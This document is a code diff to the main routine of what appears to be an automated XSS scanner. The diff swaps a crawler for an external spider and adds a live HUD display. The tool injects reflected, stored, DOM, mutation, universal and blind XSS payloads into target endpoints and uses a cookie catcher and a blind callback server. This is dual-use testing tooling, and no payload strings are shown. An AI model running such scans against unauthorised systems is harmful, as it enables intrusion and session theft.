-        params = {k: (v[0] if v else "") for k, v in qs.items()}
-        raw_eps     = [{"url": clean, "method": "GET",
-                        "params": params, "hidden": {}, "source": "cli"}]
-        spa_count   = 0; pages_count = 1; js_count = 0
-    else:
-        crawler     = Crawler(target, client, max_pages=args.max_pages,
-                              max_depth=args.depth, threads=args.threads)
-        raw_eps     = crawler.crawl()
-        spa_count   = crawler.spa_count
-        pages_count = len(crawler.visited)
-        js_count    = len(crawler.js_visited)
-        if not raw_eps:
-            p      = urllib.parse.urlparse(target)
-            qs     = urllib.parse.parse_qs(p.query, keep_blank_values=True)
-            clean  = p._replace(query="").geturl()
-            params = {k: (v[0] if v else "") for k, v in qs.items()}
-            raw_eps = [{"url": clean, "method": "GET",
-                        "params": params or {}, "hidden": {}, "source": "fallback"}]
+    # ------ Phase 1: Target Definition (Automatic Spider or JSON) ------------------------------------------------------------------------------------------------------------------
+    hud_state = HUDState(target)
+    
+    # AUTOMATIC SPIDER RUN (always)
+    final_eps = run_external_spider(target, args)
+    if not final_eps:
+        hud_state.update(log="[yellow]Spider found 0 endpoints, using target URL directly.[/]")
+        p = urllib.parse.urlparse(target); qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
+        final_eps = [{"url": p._replace(query="").geturl(), "method": "GET",
+                    "params": {k: (v[0] if v else "") for k, v in qs.items()}, 
+                    "hidden": {}, "source": "cli"}]
+    stats = {"pages": len(set(e["url"] for e in final_eps)), "js_files": 0, "spa_eps": 0}
 
-    # ── Phase 2: Parameter Discovery  (parallel per-endpoint) ───────────────
-    section("PHASE 2/4 — PARAMETER DISCOVERY", "🔍")
-    disco     = ParamDiscovery(client)
-    final_eps = []; seen = set()
-    _p2_lock  = threading.Lock()
-
-    unique_eps = []
-    for ep in raw_eps:
-        key = (ep["url"], ep["method"])
-        if key not in seen:
-            seen.add(key)
-            unique_eps.append(ep)
-
-    def _discover_ep(ep):
-        url, method = ep["url"], ep["method"]
-        existing    = list(ep["params"].keys())
-        if args.no_fuzz:
-            err_p      = disco.probe_errors(url, method)
-            discovered = [{"name": n, "source": "error_probe"} for n in err_p]
-        else:
-            discovered = disco.discover(url, method, existing=existing)
-        merged = dict(ep["params"])
-        for p in discovered:
-            if p["name"] not in merged: merged[p["name"]] = "test"
-        if merged:
-            entry = {"url": url, "method": method,
-                     "params": merged, "hidden": ep.get("hidden", {})}
-            with _p2_lock:
-                final_eps.append(entry)
-
-    p2_workers = min(args.threads, max(1, len(unique_eps)), 8)
-    with ThreadPoolExecutor(max_workers=p2_workers) as pool:
-        futs = [pool.submit(_discover_ep, ep) for ep in unique_eps]
-        for i, fut in enumerate(as_completed(futs), 1):
-            try: fut.result()
-            except Exception: pass
-            sys.stdout.write(
-                f"\r  {color(f'  discovering params... {i}/{len(unique_eps)}', C.DIM)}  ")
-            sys.stdout.flush()
-    sys.stdout.write("\r" + " " * 65 + "\r")
+    hud_state.update(endpoints_total=len(final_eps))
+    hud_state.update(current_action="Audit Initialization")
 
     if not final_eps:
         tprint(f"  {err('No testable endpoints found.')}")
         if cookie_srv: cookie_srv.stop()
         sys.exit(0)
 
-    total_params = sum(len(ep["params"]) for ep in final_eps)
-    tprint(f"\n  {ok(f'{len(final_eps)} endpoints · {total_params} params to test')}")
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # START TACTICAL HUD
+    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    hud_ui = CyberTacticalHUD(hud_state)
 
-    # ── Phase 3: Risk Scoring ─────────────────────────────────────────────────
-    section("PHASE 3/4 — PARAMETER RISK ANALYSIS", "⚠")
-    _HIGH = re.compile(
-        r"search|query|q|input|text|name|value|msg|message|"
-        r"data|comment|content|body|note|title|desc", re.I)
-    final_eps.sort(
-        key=lambda e: sum(1 for p in e["params"] if _HIGH.search(p)),
-        reverse=True)
+    def _hud_refresh(live, hud_ui, stop_event):
+        while not stop_event.is_set():
+            live.update(hud_ui.get_renderable())
+            time.sleep(0.15)
 
-    tprint(f"  {info(f'Top candidates (XSS-risk parameters):')}")
-    for ep in final_eps[:8]:
-        risky = [p for p in ep["params"] if _HIGH.search(p)]
-        marker = color("★ ", C.BRED) if risky else color("◈ ", C.BYELLOW)
-        pd_str = ", ".join(
-            color(p, C.BRED if p in risky else C.BWHITE)
-            for p in list(ep["params"].keys())[:5])
-        tprint(f"  {marker}{color(ep['method'], C.BYELLOW)} "
-               f"{color(ep['url'][:55], C.BWHITE)}  [{pd_str}]")
+    with Live(hud_ui.get_renderable(), console=console, refresh_per_second=10, screen=False) as live:
+        _stop = threading.Event()
+        _refresher = threading.Thread(target=_hud_refresh, args=(live, hud_ui, _stop), daemon=True)
+        _refresher.start()
+        # Phase 4: Reflected XSS Testing
+        tester = XSSTester(client, tier=args.tier, delay=args.delay, catcher=catcher_url, hud_state=hud_state)
+        findings = tester.run(final_eps, catcher_obj=cookie_srv, threads=args.threads)
+        caught = cookie_srv.summary() if cookie_srv else []
 
-    # ── Phase 4: XSS Testing ─────────────────────────────────────────────────
-    tester   = XSSTester(client, tier=args.tier,
-                          delay=args.delay, catcher=catcher_url)
-    findings = tester.run(final_eps, catcher_obj=cookie_srv, threads=args.threads)
-    caught   = cookie_srv.summary() if cookie_srv else []
+        # Phase 5: Stored XSS
+        hud_state.update(current_action="Stored XSS Scan")
+        stored_findings = []
+        if not getattr(args, "no_stored", False):
+            writable_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
+            if writable_eps:
+                _visited = list(set(e["url"] for e in final_eps))
+                stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
+                stored_findings = stored_scanner.scan(writable_eps, target)
 
-    stats = {
-        "pages":     pages_count,
-        "js_files":  js_count,
-        "spa_eps":   spa_count,
-        "endpoints": len(final_eps),
-        "params":    total_params,
-    }
+        # Phase 6: DOM XSS
+        hud_state.update(current_action="DOM XSS Scan")
+        dom_findings = []
+        if not getattr(args, "no_dom", False):
+            dom_scanner = DOMXSSScanner(client)
+            dom_eps_done = set()
+            for ep in final_eps:
+                url = ep["url"]
+                if url in dom_eps_done: continue
+                dom_eps_done.add(url)
+                try:
+                    resp = client.get(url, ep["params"])
+                    body = resp.get("body","")
+                    static = dom_scanner.scan_js_source(url, body)
+                    dom_findings.extend(static)
+                    dynamic = dom_scanner.probe_params(url, ep["params"])
+                    dom_findings.extend(dynamic)
+                except Exception: pass
 
-    # ── Phase 5: Stored XSS ───────────────────────────────────────────────────
-    stored_findings = []
-    if not getattr(args, "no_stored", False):
-        writable_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
-        if writable_eps:
-            _visited = list(crawler.visited) if not args.no_crawl and "crawler" in dir() else []
-            stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
-            stored_findings = stored_scanner.scan(writable_eps, target)
-            tprint(f"  {info('No POST/PUT endpoints found — skipping stored XSS scan')}")
-    else:
-        tprint(f"  {info('Stored XSS scan skipped (--no-stored)')}")
+        # Phase 7: mXSS
+        hud_state.update(current_action="Mutation XSS Scan")
+        mxss_findings = []
+        if not getattr(args, "no_stored", False):
+            mxss_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
+            for ep in mxss_eps[:10]:
+                for param in ep["params"]:
+                    for mpl in MXSS_PAYLOADS[:6]:
+                        try:
+                            resp = client.post(ep["url"], {**ep["params"], param: mpl})
+                            if any(s in resp.get("body","") for s in ["alert(1)","onerror=alert"]):
+                                f = {"type":"mxss","url":ep["url"],"param":param,"payload":mpl[:60],"score":85}
+                                mxss_findings.append(f)
+                                hud_state.add_finding(f)
+                                break
+                        except Exception: pass
 
-    # ── Phase 6: DOM XSS static + dynamic probe ───────────────────────────────
-    dom_findings = []
-    if not getattr(args, "no_dom", False):
-        section("DOM XSS — SINK/SOURCE ANALYSIS", "🔬")
-        dom_scanner = DOMXSSScanner(client)
-        dom_eps_done = set()
-        for ep in final_eps:
-            url = ep["url"]
-            if url in dom_eps_done: continue
-            dom_eps_done.add(url)
-            try:
-                resp = client.get(url, ep["params"])
-                body = resp.get("body","")
-                # Static JS analysis
-                static = dom_scanner.scan_js_source(url, body)
-                dom_findings.extend(static)
-                # Dynamic param probe
-                dynamic = dom_scanner.probe_params(url, ep["params"])
-                dom_findings.extend(dynamic)
-            except Exception: pass
-        if dom_findings:
-            tprint(f"  {color('DOM XSS', C.BRED, C.BOLD)} {color(str(len(dom_findings)) + ' potential issues found', C.BWHITE)}")
-            for d in dom_findings[:5]:
-                tprint(f"  {color('  type   :', C.DIM)} {color(d.get('type','?'), C.BYELLOW)}")
-                tprint(f"  {color('  url    :', C.DIM)} {color(d.get('url','?')[:60], C.BCYAN)}")
-                if d.get('param'):
-                    tprint(f"  {color('  param  :', C.DIM)} {color(d.get('param','?'), C.BRED, C.BOLD)}")
-                tprint(f"  {color('  detail :', C.DIM)} {color(d.get('detail','?')[:60], C.DIM)}")
-        else:
-            tprint(f"  {ok('No DOM XSS patterns detected in static analysis')}")
-    else:
-        tprint(f"  {info('DOM XSS scan skipped (--no-dom)')}")
-
-    # ── Phase 7: mXSS — inject mutation payloads into POST endpoints ──────────
-    mxss_findings = []
-    if not getattr(args, "no_stored", False):
-        section("MUTATION XSS (mXSS) — SANITIZER BYPASS", "🧬")
-        mxss_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
-        mxss_confirmed = 0
-        for ep in mxss_eps[:10]:
-            url = ep["url"]
-            for param in list(ep["params"].keys()):
-                for mpl in MXSS_PAYLOADS[:6]:
-                    test_params = {**ep["params"], param: mpl}
+        # Phase 8: uXSS
+        hud_state.update(current_action="Universal XSS Scan")
+        uxss_findings = []
+        for ep in final_eps[:15]:
+            for param in list(ep["params"].keys())[:3]:
+                for upl in UXSS_PAYLOADS[:5]:
                     try:
-                        resp = client.post(url, test_params)
-                        body = resp.get("body","")
-                        if any(sig in body for sig in ["alert(1)","onerror=alert","onload=alert"]):
-                            mxss_findings.append({"type":"mxss","url":url,"param":param,"payload":mpl[:60]})
-                            mxss_confirmed += 1
-                            tprint(f"  {color('mXSS', C.BRED, C.BOLD)} {color(url[:55], C.BWHITE)}")
-                            tprint(f"  {color('  param  :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
-                            tprint(f"  {color('  payload:', C.DIM)} {color(mpl[:60], C.BRED)}")
+                        resp = client.get(ep["url"], {**ep["params"], param: upl}) if ep["method"] == "GET" else client.post(ep["url"], {**ep["params"], param: upl})
+                        if "alert(document.domain)" in resp.get("body",""):
+                            f = {"type":"uxss","url":ep["url"],"param":param,"payload":upl[:60],"score":90}
+                            uxss_findings.append(f)
+                            hud_state.add_finding(f)
                             break
                     except Exception: pass
-        tprint(f"  {ok(str(mxss_confirmed) + ' mXSS findings')}")
 
-    # ── Phase 8: uXSS — inject universal XSS payloads ────────────────────────
-    uxss_findings = []
-    section("UNIVERSAL XSS (uXSS) — CROSS-ORIGIN VECTORS", "🌐")
-    for ep in final_eps[:15]:
-        url = ep["url"]
-        for param in list(ep["params"].keys())[:3]:
-            for upl in UXSS_PAYLOADS[:5]:
-                test_params = {**ep["params"], param: upl}
-                try:
-                    resp = client.get(url, test_params) if ep["method"] == "GET" else client.post(url, test_params)
-                    body = resp.get("body","")
-                    if any(sig in body for sig in ["alert(document.domain)","document.domain","vbscript:"]):
-                        if "alert(document.domain)" in body:
-                            uxss_findings.append({"type":"uxss","url":url,"param":param,"payload":upl[:60]})
-                            tprint(f"  {color('uXSS', C.BRED, C.BOLD)} {color(url[:55], C.BWHITE)} param={color(param, C.BRED)}")
-                            break
-                except Exception: pass
-    tprint(f"  {ok(str(len(uxss_findings)) + ' uXSS findings')}")
+        # Phase 9: Blind XSS
+        hud_state.update(current_action="Blind XSS Scan")
+        blind_findings = []
+        blind_srv = None
+        blind_port = getattr(args, "blind_port", 0)
+        if not getattr(args, "no_blind", False) and blind_port != -1:
+            blind_srv = BlindXSSServer(port=blind_port if blind_port else 0)
+            blind_url = blind_srv.start()
+            if blind_url:
+                blind_token = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+                blind_tester = BlindXSSTester(client, blind_url, blind_token)
+                blind_findings = blind_tester.scan(final_eps, blind_srv)
+                for bf in blind_findings:
+                    hud_state.add_finding({"xss_type":"blind","param":"N/A","url":bf.get("data",{}).get("src","?")})
 
-    # ── Phase 9: Blind XSS ────────────────────────────────────────────────────
-    blind_findings = []
-    blind_srv = None
-    blind_port = getattr(args, "blind_port", 0)
-    if not getattr(args, "no_blind", False) and blind_port != -1:
-        blind_srv = BlindXSSServer(port=blind_port if blind_port else 0)
-        blind_url = blind_srv.start()
-        if blind_url:
-            blind_token = "".join(__import__("random").choices(__import__("string").ascii_uppercase + __import__("string").digits, k=10))
-            blind_tester = BlindXSSTester(client, blind_url, blind_token)
-            blind_findings = blind_tester.scan(final_eps, blind_srv)
-        else:
-            tprint(f"  {warn('Blind XSS server could not start — skipping')}")
-    else:
-        tprint(f"  {info('Blind XSS scan skipped (--no-blind or no port)')}")
+        hud_state.update(current_action="Audit Complete")
+        time.sleep(1)
+        _stop.set()
 
-    # ── Collect all extras for report ─────────────────────────────────────────
-    stats["stored"]   = len(stored_findings)
-    stats["dom"]      = len(dom_findings)
-    stats["mxss"]     = len(mxss_findings)
-    stats["uxss"]     = len(uxss_findings)
-    stats["blind"]    = len(blind_findings)
-
+    # ------ Final Report ------
+    stats.update({"endpoints": len(final_eps), "params": sum(len(e["params"]) for e in final_eps)})
     print_report(findings, target, stats, caught,
                  stored=stored_findings, dom=dom_findings,
-                 mxss=mxss_findings, uxss=uxss_findings,
-                 blind=blind_findings)
+                 mxss=mxss_findings, uxss=uxss_findings, blind=blind_findings)
 
     if args.output:
         export_json(findings, target, stats, caught, args.output,
                     stored=stored_findings, dom=dom_findings,
-                    mxss=mxss_findings, uxss=uxss_findings,
-                    blind=blind_findings)
+                    mxss=mxss_findings, uxss=uxss_findings, blind=blind_findings)
 
-    if cookie_srv:
-        cookie_srv.stop()
-    if blind_srv:
-        blind_srv.stop()
-
-    all_confirmed = (len(findings) + len(stored_findings) + len(mxss_findings)
-                     + len(uxss_findings) + len(blind_findings))
-    sys.exit(1 if all_confirmed > 0 else 0)
-
+    if cookie_srv: cookie_srv.stop()
+    if blind_srv: blind_srv.stop()
 
 if __name__ == "__main__":
     main()
